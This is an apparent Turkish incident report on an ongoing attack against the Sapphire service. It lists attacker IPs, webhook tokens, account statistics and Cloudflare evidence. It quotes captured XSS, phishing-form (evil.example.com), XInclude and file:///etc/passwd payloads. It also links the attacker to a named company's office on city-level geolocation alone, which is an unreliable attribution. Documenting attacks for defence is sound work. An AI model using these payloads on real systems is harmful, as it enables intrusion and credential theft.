# CANLI SALDIRI RAPORU — 29 NİSAN 2026
## Tarih: 29/04/2026 13:05 UTC+3

Saldırı 28 Nisan'da başlamış, 29 Nisan itibarıyla devam etmektedir.
Bu belge, devam eden saldırının teknik bulgularını içerir.

---

## 1. İKİNCİ IP ADRESİ TESPİT EDİLDİ

Saldırgan 28 Nisan akşamı (20:39 UTC / 23:39 TR) ikinci bir webhook.site 
token'ı oluşturmuştur. Bu token farklı bir IP'den oluşturulmuştur:

| Özellik | Birinci IP (28 Nisan gündüz) | İkinci IP (28 Nisan gece) |
|---------|------------------------------|---------------------------|
| IP | 84.44.79.182 | 131.222.238.224 |
| Şehir | Bursa | İstanbul |
| ISP | Vodafone (Borusan Telekom) | 4GNET (mobil internet) |
| Tür | Sabit internet (ofis) | Mobil bağlantı (telefon/hotspot) |
| Araç | curl/8.12.1 | curl/8.12.1 |
| Webhook Token | e9da1ee6-ded1-4e10-8dc5-0d5ad73352a3 | aeae90e6-807e-417d-9c4c-d00c6529f6b1 |
| Saldırı Saati | 13:20 UTC (mesai) | 20:39 UTC (mesai dışı) |

**Ortak noktalar:**
- Her iki IP'den de aynı araç kullanılmış: curl/8.12.1
- Her iki token da aynı amaçla kullanılmış: SSRF callback
- Sapphire sunucusu (162.220.234.129) her iki token'a da callback yapmış

**Yorum:** Saldırgan mesai saatlerinde ofis internetinden (Bursa — Vodafone),
mesai dışında mobil internetten (İstanbul — 4GNET) çalışmaya devam etmiştir.
A.I.T.'nin İstanbul ofisi 2014'te açılmıştır (kaynak: ait.com.tr).

---

## 2. YENİ SALDIRI VEKTÖRLERİ (29 Nisan)

### 2.1 Stored XSS Denemesi
Pattern adı: "XSS Test" (Test5 hesabı)
```
<script type="text/javascript">alert("XSS on " + document.domain)</script>
```
Amaç: Site üzerinde JavaScript çalıştırma

### 2.2 Phishing Formu
Pattern adı: "Phishing SVG" (ssrf-test hesabı)
```
<form action="https://evil.example.com/steal" method="POST">
  Email / Password alanları
```
Amaç: Sahte login formu ile kullanıcı bilgisi çalma

### 2.3 Kaynak Kod Okuma (XInclude)
Pattern adı: "route-source" (PenTest User 2 hesabı)
```
<xi:include href="file:///app/src/app/api/export/route.ts" parse="text">
```
Amaç: Sapphire'ın export API kaynak kodunu okuma

### 2.4 Sunucu Dosya Okuma
Pattern adı: "passwd ref" (Test User4 hesabı)
```
<image xlink:href="file:///etc/passwd">
```
Amaç: Sunucu kullanıcı listesini çalma

### 2.5 Docker Port Tarama (YENİ)
Tarih: 29 Nisan 08:46 UTC
```
ECONNREFUSED 127.0.0.1:2375  ← Docker daemon (HTTP)
ECONNREFUSED 127.0.0.1:2376  ← Docker daemon (HTTPS)
ECONNREFUSED 127.0.0.1:4243  ← Docker daemon (eski port)
```
Amaç: Docker container'a doğrudan erişim — dünkü port scan'den daha hedefli

### 2.6 Yetkisiz Admin Erişimi (devam)
29 Nisan'da 13 kez daha admin paneline yetkisiz erişim denemesi

### 2.7 Otomatik Hesap Oluşturma (Botnet)
00:24 UTC'de 1 saniye aralıklarla 9 hesap açılmış:
exfil_100000, exfil_100001, ..., exfil_100008
Bu, otomatik script ile yapılmıştır.

### 2.8 Senin Domain'in ile Sahte Hesaplar
Saldırgan senin kendi domain'inle hesap açmaya çalışmış:
- admin@sapphiresc.com
- info@sapphiresc.com
- support@sapphiresc.com
- test@sapphiresc.com

---

## 3. HESAP İSTATİSTİKLERİ

| Metrik | Değer |
|--------|-------|
| Toplam saldırgan hesabı | 36+ |
| Hepsi @deltajohnsons.com | Evet (aynı disposable domain) |
| Toplam credit hareketi | 1450+ |
| Toplam pattern | 18+ |
| API key oluşturma | 3+ |
| SSRF olayı (29 Nisan) | 11 yeni |
| Yetkisiz erişim (29 Nisan) | 13 yeni |
| Docker port scan | 3 port (yeni vektör) |

---

## 4. CLOUDFLARE DOĞRUDAN DELİL

Cloudflare Security Analytics'te Source IP = 84.44.79.182 filtresi ile
29 Nisan 2026 tarihli istekler görüntülenmiştir:

- /api/upscale, /api/vectorize, /api/export, /api/exports
- /api/export/list, /api/export/history, /api/user/downloads
- /dashboard, /_next/static/...

Bu, Cloudflare'ın kendi kayıtlarında saldırgan IP'nin doğrudan 
görünmesi anlamına gelir — üçüncü parti bağımsız teyit.

---

## 5. SONUÇ

Saldırı tek seferlik bir merak değil, 2 gün boyunca süren, 2 farklı IP'den 
(ofis + mobil), 36 hesapla, otomatik scriptlerle desteklenen organize bir 
saldırıdır. Saldırı vektörleri giderek yoğunlaşmaktadır:
- 28 Nisan: SSRF + port scan + credit manipülasyonu
- 29 Nisan: XSS + phishing + kaynak kod okuma + Docker port scan

Her iki IP'de de aynı araç (curl/8.12.1) kullanılmıştır.

